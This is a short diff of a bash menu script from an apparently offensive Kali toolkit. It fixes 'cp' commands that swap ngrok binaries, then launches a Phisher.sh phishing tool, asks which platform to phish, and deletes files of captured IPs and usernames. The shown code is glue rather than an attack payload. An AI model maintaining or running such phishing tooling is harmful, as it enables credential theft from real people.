@@ -36,9 +36,9 @@ do
      [2][oO]|[2])
    echo "Starting script... "
    cd /home/kali/Desktop/KOZ1OLMENU/Phisher
-   cp ngrok > ngrok2
+   cp ngrok ngrok2
    sudo rm ngrok
-   cp ngrok_arm > ngrok
+   cp ngrok_arm ngrok
    sudo rm ngrok_arm
    ./Phisher.sh
    read -r -p "Which platform do you phish ? - " platform2
@@ -50,9 +50,9 @@ do
    rm ip.txt
    rm usernames.txt
    cd /home/kali/Desktop/KOZ1OLMENU/Phisher
-   cp ngrok > ngrok_arm
+   cp ngrok ngrok_arm
    sudo rm ngrok
-   cp ngrok2 > ngrok
+   cp ngrok2 ngrok
    sudo rm ngrok2
    cd /home/kali/Desktop/KOZ1OLMENU
  
